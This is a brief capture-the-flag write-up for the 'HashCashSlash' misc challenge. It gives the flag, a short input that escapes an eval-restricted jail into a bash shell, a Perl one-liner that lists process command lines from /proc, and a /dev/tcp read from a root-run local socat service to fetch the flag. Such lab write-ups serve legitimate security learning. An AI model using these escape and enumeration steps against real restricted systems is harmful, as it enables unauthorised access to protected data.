# misc - HashCashSlash

SOLVED by Ha1qal 

Flag:`0xL4ugh{m1n1m4l_1nput_m4x1mum_d4m4g3_5d5b822bd3b52c9a}`

```
\$$#
Jailbreak (\$$#): You bypassed the eval restriction by dynamically constructing $0 (which calls bash), giving you a shell.
```

we get into the shell and then we can't cat flag because it's for root privilage so we check any tools available to check running program.For this we use perl.

```
perl -e 'opendir(D,"/proc"); for my $p (grep /^\d+$/, readdir(D)) { open(F, "/proc/$p/cmdline"); $c = <F>; $c =~ s/\0/ /g; print "$p: $c\n" if $c; close(F); }'
```
Output Discovery: The output reveals a suspicious process running as root:` 9: socat TCP-LISTEN:35927,bind=127.0.0.1,reuseaddr,fork EXEC:cat /flag`

so in order to get the flag we just run this command
`cat < /dev/tcp/127.0.0.1/35927`

Solved by: yappare